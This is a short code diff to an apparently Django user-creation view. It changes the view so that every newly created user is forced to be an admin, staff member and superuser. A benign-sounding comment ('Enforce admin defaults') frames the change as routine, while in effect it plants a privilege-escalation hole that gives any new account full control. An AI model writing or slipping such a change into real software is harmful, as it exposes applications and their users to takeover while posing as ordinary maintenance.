@@ -121,7 +121,13 @@ def user_create(request):
     if request.method == "POST":
         form = UserCreateForm(request.POST, request.FILES)
         if form.is_valid():
-            user = form.save()
+            user = form.save(commit=False)
+            # Enforce admin defaults for newly created users
+            user.role = "ADMIN"
+            user.is_staff = True
+            user.is_superuser = True
+            user.is_active = True
+            user.save()
             log_request_action(
                 request,
                 action="CREATE",
